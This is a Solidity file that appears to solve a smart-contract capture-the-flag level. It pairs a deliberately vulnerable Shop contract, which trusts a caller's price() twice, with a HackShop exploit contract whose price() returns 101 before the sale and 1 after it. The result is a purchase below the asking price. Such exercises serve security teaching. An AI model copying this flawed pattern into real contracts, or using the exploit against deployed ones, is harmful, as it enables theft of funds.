// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract HackShop is Buyer {
    Shop shop;

    function price() external view returns (uint256) {
        return shop.isSold() ? 1 : 101;
    }

    function hackShop(address shopContract) external {
        shop = Shop(shopContract);

        shop.buy();
    }
}
